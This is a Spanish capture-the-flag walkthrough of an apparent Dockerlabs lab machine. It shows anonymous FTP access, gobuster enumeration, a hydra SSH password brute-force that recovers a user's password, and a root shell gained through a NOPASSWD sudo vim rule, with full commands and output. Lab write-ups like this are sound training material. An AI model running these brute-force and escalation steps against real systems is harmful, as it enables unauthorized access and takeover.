```bash
└─# ftp 172.17.0.3
Connected to 172.17.0.3.
220 (vsFTPd 3.0.5)
Name (172.17.0.3:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||63447|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp> get chat-gonza.txt
local: chat-gonza.txt remote: chat-gonza.txt
229 Entering Extended Passive Mode (|||10822|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |*************************************************|   667        6.98 MiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (1.16 MiB/s)
ftp> get pendientes.txt
local: pendientes.txt remote: pendientes.txt
229 Entering Extended Passive Mode (|||56438|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |*************************************************|   315        3.16 MiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (607.93 KiB/s)
ftp> exit
221 Goodbye.

```

Me descargo los siguientes ficheros y veo lo siguiente

```
┌──(root㉿38095a406ad0)-[/home]
└─# cat 
chat-gonza.txt  pendientes.txt  
┌──(root㉿38095a406ad0)-[/home]
└─# cat chat-gonza.txt 
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy

┌──(root㉿38095a406ad0)-[/home]
└─# cat pendientes.txt 
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..

```

Vamos a hacer un escaneo a la web, solo pone que tenemos un apache normalito

```bash
┌──(root㉿38095a406ad0)-[/home]
└─# gobuster dir -u http://172.17.0.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 5208]
/backup               (Status: 301) [Size: 309] [--> http://172.17.0.3/backup/]
/important            (Status: 301) [Size: 312] [--> http://172.17.0.3/important/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================

```

![[Pasted image 20250514105634.png]]

![[Pasted image 20250514105707.png]]

Interesante, tenemos usuario para el ssh, vamos ha hacer un hydra con este usuario

```bash

┌──(root㉿38095a406ad0)-[~]
└─# hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 10
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-14 08:58:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-14 08:59:32


```

Tenemos credenciales validas para el login del usuario, ahora a probar a iniciar sesion

```bash
┌──(root㉿38095a406ad0)-[~]
└─# ssh russoski@172.17.0.3
The authenticity of host '172.17.0.3 (172.17.0.3)' can't be established.
ED25519 key fingerprint is SHA256:R8ZiOJN33rhfvGADBLwVQ1mPV7lSmGJACOhjdTB0wMQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.3' (ED25519) to the list of known hosts.
russoski@172.17.0.3's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.14.5-300.fc42.x86_64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
russoski@10657f824b25:~$ sudo -l
Matching Defaults entries for russoski on 10657f824b25:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User russoski may run the following commands on 10657f824b25:
    (root) NOPASSWD: /usr/bin/vim
russoski@10657f824b25:~$ sudo vim

```

Vulnerabilidad del VIM, podriamos abrir una shell desde vim con permisos de sudo

```bash
russoski@10657f824b25:~$ sudo vim

# whoami
root
# 

```